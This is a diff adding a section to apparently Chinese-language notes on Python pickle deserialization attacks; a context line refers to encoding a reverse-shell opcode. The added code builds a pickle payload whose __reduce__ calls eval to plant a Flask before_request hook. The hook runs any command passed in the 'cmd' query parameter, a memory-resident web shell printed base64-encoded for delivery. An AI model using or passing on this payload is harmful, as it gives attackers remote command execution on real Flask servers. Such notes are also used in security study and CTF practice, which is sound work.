@@ -214,3 +214,18 @@ print(base64.b64encode(opcode)) #对反弹shell进行unicode即可。
 ```
 ![](.topwrite/assets/image_1736578398139.png)
 参考：<https://blog.csdn.net/your_friends/article/details/126979899>
+
+
+^
+#### **传python马**
+```
+import pickle
+import base64
+class test():
+    def __reduce__(self):
+        return (eval,("__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen(request.args.get('cmd')).read())",))
+
+a = test()
+b = pickle.dumps(a)
+print(base64.b64encode(b))
+```
